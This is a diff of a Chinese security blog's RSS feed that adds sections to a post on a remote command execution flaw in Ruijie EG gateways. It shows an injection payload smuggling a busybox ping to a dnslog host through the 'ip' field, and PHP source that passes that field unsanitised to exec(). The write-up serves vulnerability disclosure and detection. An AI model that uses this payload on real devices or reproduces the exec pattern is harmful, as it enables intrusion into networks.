@@ -5,8 +5,8 @@
     <description>这里是 Seal 的个人博客，与你一起发现更大的世界。</description>
     <link>https://luckseal.github.io/</link>
     <atom:link href="https://luckseal.github.io/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Tue, 29 Dec 2020 10:56:15 +0800</pubDate>
-    <lastBuildDate>Tue, 29 Dec 2020 10:56:15 +0800</lastBuildDate>
+    <pubDate>Tue, 29 Dec 2020 11:17:31 +0800</pubDate>
+    <lastBuildDate>Tue, 29 Dec 2020 11:17:31 +0800</lastBuildDate>
     <generator>Jekyll v4.1.1</generator>
     
       <item>
@@ -50,6 +50,56 @@ mac=1&amp;amp;ip=%60busybox ping -c 2 pingtest.xxx.ceye.io%60
 &lt;p&gt;&lt;img src=&quot;/img/2020-12-29-锐捷易网关远程命令执行/image-20201229102942098.png&quot; alt=&quot;image-20201229102942098&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/img/2020-12-29-锐捷易网关远程命令执行/image-20201229103053455.png&quot; alt=&quot;image-20201229103053455&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;漏洞代码&quot;&gt;漏洞代码&lt;/h3&gt;
+
+&lt;p&gt;利用漏洞下载php文件，查看源码：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&amp;lt;?php
+    //查询用户是否上线了
+    $userip = @$_POST['ip'];
+    $usermac = @$_POST['mac'];
+    if (!$userip || !$usermac) {
+        exit;
+    }
+    /* 判断该用户是否已经放行 */
+    $cmd = '/sbin/app_auth_hook.elf -f ' . $userip;
+    $res = exec($cmd, $out, $status);
+    /* 如果已经上线成功 */
+    if (strstr($out[0], &quot;status:1&quot;)) {
+        echo 'true';
+    }
+?&amp;gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;漏洞检测&quot;&gt;漏洞检测&lt;/h3&gt;
+
+&lt;p&gt;无法直接回显，漏洞检测可以通过以下两种方式：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;dnslog&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;写文件探测&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
 </description>
         <pubDate>Tue, 29 Dec 2020 20:00:00 +0800</pubDate>
         <link>https://luckseal.github.io/2020/12/29/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</link>
